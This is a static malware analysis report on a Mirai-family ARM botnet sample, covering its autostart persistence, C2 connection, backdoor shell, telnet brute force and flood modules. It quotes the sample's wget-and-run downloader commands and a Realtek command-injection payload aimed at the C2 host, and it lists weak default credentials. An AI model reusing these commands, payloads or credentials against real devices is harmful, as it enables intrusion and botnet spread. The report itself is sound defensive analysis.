> [!WARNING]
> **Verdict: malicious** · Family **Mirai** · Confidence **high**
> 
> Aliases: Mirai-based IoT botnet, Mirai variant (selfrep realtek/telnet)
> 
> A 32-bit ARM Linux ELF (statically linked, stripped); decompilation confirms it has the full attack surface of a Mirai-family IoT botnet: it writes /etc/init.d/xs.main and /etc/rc.local for boot autostart, feeds the hardware watchdog to stay alive, connects to the hardcoded 206.189.84[.]190 (CNC TCP/8060) to receive text commands, executes !shellcmd remote commands, opens a password-protected interactive shell backdoor with !openshell, brute-forces about 20 built-in weak credentials on TCP/23 and delivers telnet.sh, and uses UDP/9034 to deliver a realtek command-injection payload for self-replication, and it has built-in HTTP and raw TCP flood modules. All of the above logic was cross-verified by decompilation of real bytes and string/pointer tables; the conclusions do not depend on any runtime behavior.

## Behavior Analysis

There are **10** behaviors in total, each backed by evidence, and all are statically available.

### 1. Write init.d autostart

`T1037.004` · Confidence **high** · Static

FUN_000083cc first checks the /etc/init.d directory, then opens /etc/init.d/xs.main with "w" and writes "#!/bin/sh\n<self path> <startup args>" and chmod 0755; it then opens /etc/rc.local with "a" and appends a "%s %s" line, forming two boot-autostart paths.

> **Evidence**: FUN_000083cc@0x83cc: fopen(0x2a360 "/etc/init.d/xs.main","w"), fprintf("#!/bin/sh\n%s %s\n"), chmod(0x1ed), fopen(0x2a38c "/etc/rc.local","a")
> 
> **Source**: `ev-000007` · `ev-000014`

### 2. Feed hardware watchdog

`T1562` · Confidence **high** · Static

Every ~5 seconds FUN_0000b4d4 tries to open 8 candidate paths including /dev/watchdog, /dev/misc/watchdog, /dev/watchdog0, /dev/watchdog1, watchdogd, sbin/watchdog and bin/sw_watchdog; after the first success it keeps writing 1 byte to that fd, preventing the host device from rebooting on hardware-watchdog timeout and losing the infection.

> **Evidence**: FUN_0000b4d4@0xb4d4: 8 watchdog path literals 0xb75c-0xb778, write(fd, buf, 1) after success
> 
> **Source**: `ev-000008` · `ev-000014`

### 3. Connect to C2 for commands

`T1095` · Confidence **medium** · Static

Main function FUN_0000b8a8 resolves 206.189.84[.]190 with getaddrinfo, builds a sockaddr_in (port halfword 0x7C1F, memory bytes 1F 7C, i.e. TCP/8060), connects non-blocking and retries up to 24 times; once connected it sends the identity string "armv6l <botid>", then loops reading and dispatching text commands from the CNC.

> **Evidence**: FUN_0000b8a8@0xb8a8: getaddrinfo(0x2a918), 0xb95c add lr,#0x1f / 0xb96c strh lr,[r8,#0x22], connect retried 0x18 times, send "armv6l"(0x2a928)
> 
> **Source**: `ev-000004` · `ev-000014`

### 4. Run CNC remote commands

`T1059.004` · Confidence **high** · Static

The command dispatcher recognizes the "!shellcmd " prefix, formats the argument as "%s 2>&1", runs it through popen in /bin/sh and returns the output to the CNC; it also supports control commands such as !selfrep telnet / !selfrep realtek / !kill / stop / off / ping.

> **Evidence**: FUN_0000b8a8@0xc8e4 "!shellcmd ", 0xc8e8 "%s 2>&1", 0xc8ec "r" (popen); control strings 0xc8a4 "stop", 0xc8d0 "off", 0xc8bc "ping", 0xc8c0 "pong %s", 0xc8b8 "!kill"
> 
> **Source**: `ev-000004` · `ev-000014`

### 5. Open password-gated backdoor shell

`T1059.004` · Confidence **high** · Static

FUN_0000d020 is triggered by "!openshell": it sets up a TCP listener, prints a colored "> Password: " after accept, and compares the input against an 8-byte password; on success it forks, dup2s the socket and executes /bin/bash, /bin/sh or /bin/busybox sh (-i --noprofile --norc), on failure it echoes "Wrong password!", and when no shell is available it echoes "No shell available".

> **Evidence**: FUN_0000d020@0xd020 (called from the "!openshell" branch via FUN_0000d37c, pointer table 0xD438): socket/bind/listen/accept, write(0x2ab28 "...Password: "), strncmp(..., param+1, 8), "Access granted!"(0x2ab40)/"Wrong password!"(0x2ab94) branches, execve table of three shell paths 0x2ABEC(/bin/bash), 0x2ABF0(/bin/sh), 0x2ABF4(/bin/busybox)
> 
> **Source**: `ev-000009` · `ev-000002`

### 6. Telnet weak-credential brute force

`T1110.001` · Confidence **high** · Static

FUN_0000e020 makes concurrent weak-credential attempts on TCP/23 against randomly generated target IPs, using a table of about 20 username-password pairs starting at .data 0x2CAC8 (root/ftp/user/admin/postgres × xc3511/888888/default/password/klv1234/7ujMko0admin/dreambox and others), advancing a login state machine on Login:/login:/username:/Password: and #/$/> prompts.

> **Evidence**: FUN_0000e020@0xe020: socket(AF_INET,SOCK_STREAM), 0xe0xx sockaddr port halfword 0x1700 (bytes 00 17 → TCP/23), prompt pointer table 0x2ad54, credential table 0x2cac8
> 
> **Source**: `ev-000013` · `ev-000014`

### 7. Deliver telnet.sh downloader

`T1105` · Confidence **high** · Static

After a successful telnet login, FUN_0000e020 sends the peer shell "cd /tmp || cd /var || cd /dev/shm;wget hxxp://206.189.84[.]190:87/telnet.sh; curl -O ...; chmod 777 telnet.sh; sh telnet.sh", making the controlled device fetch and run the script itself.

> **Evidence**: FUN_0000e020@0xe624 formats the 0x2abf8 template, with the argument taken from 0x2ab14 "206.189.84[.]190:87"
> 
> **Source**: `ev-000013` · `ev-000014`

### 8. Deliver realtek payload over UDP

`T1190` · Confidence **high** · Static

FUN_0000ce1c continuously generates random source/destination addresses and sends the command-injection payload "orf; cd /tmp; /bin/busybox wget hxxp://206.189.84[.]190:87/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; ... /mips ..." over UDP to target port 9034 (0x234A), targeting Realtek/mips routers for self-replication.

> **Evidence**: FUN_0000ce1c@0xce1c: socket(2,2,0), 0xcf18-0xcf30 port constant 0x4a23 written into sockaddr+0x32, sendto payload 0x2aa6c, host string 0x2ab14
> 
> **Source**: `ev-000005` · `ev-000014`

### 9. HTTP flood attack

`T1498.001` · Confidence **high** · Static

The HTTP flood module (FUN_00009de8) uses a fixed Chrome/58 UA and three request templates (GET, POST, HEAD), continuously sending requests to the attack target per the psize/srcport/httpmode/port/usleep parameters delivered by the CNC.

> **Evidence**: 0x9dd8 UA, 0x9ddc GET, 0x9de0 POST, 0x9de4 HEAD request templates; parameter strings 0xc8f8 psize=, 0xc934 srcport=, 0xc938 httpmode=, 0xc93c gport=, 0xc944 proto=, 0xc95c usleep=, 0xc960 port=
> 
> **Source**: `ev-000002` · `ev-000014`

### 10. Raw TCP packet flood

`T1498` · Confidence **high** · Static

FUN_0000d43c uses socket(AF_INET, SOCK_RAW, IPPROTO_TCP) to hand-build IP/TCP headers and checksums and loops sendto per the psize/srcport/flags parameters, constituting SYN/ACK and other TCP-layer floods.

> **Evidence**: FUN_0000d43c@0xd43c: socket(2,3,6), hand-filled TCP header, FUN_00008190/FUN_000081e0 compute header checksums, loop sendto(0x4000)
> 
> **Source**: `ev-000012` · `ev-000014`

## Do Not Misjudge

:::important
The following conclusions are **easy to misjudge**; please note them when citing this report.

- Do not call it ransomware or a miner: the sample contains no file-encryption/key material, mining-pool address or mining-algorithm constants.
- Do not call it a generic Windows trojan or PE loader: the file is a 32-bit little-endian ARM Linux ELF (statically linked, no interp) and contains no PE parsing or Windows API logic.
- Do not claim a real C2 session or successful outbound connection was observed: this run is static inference only, with no network request/response records obtained.
- Do not state the !openshell backdoor's listening port and password as known constants: both are stored in .bss and written at runtime, so static analysis cannot recover their values.
:::

## Analysis Method and Limitations

| Item | Content |
|:--|:--|
| Analysis method | Static decompilation (dynamic execution yielded no runtime behavior) |
| Unpacking | No |

**Limitations and pending verification**

1. Both isolated execution and user-mode instruction emulation exited with SIGSEGV during startup (producing no file or network events), so all behavior conclusions come from static decompilation and recoverability is static throughout.
2. The C2 206[.]189[.]84[.]190:8060 and the HTTP payload port 87 were recovered only from code and strings with no session evidence, hence pending_dynamic_verify=true.
3. The !openshell backdoor's listening port and 8-byte password are stored in .bss and written at runtime; static analysis did not obtain their concrete values.
4. The telnet credential table was recovered entry by entry via pointers; a few entries were truncated by length and only known fragments were recovered (e.g. "5up", "anko"), so the full set may be larger.
5. The UDP self-replication payload's target port is written from constant 0x4A23 in network order, which converts to 9034; whether that port is a real service port on the devices was not verified at runtime.
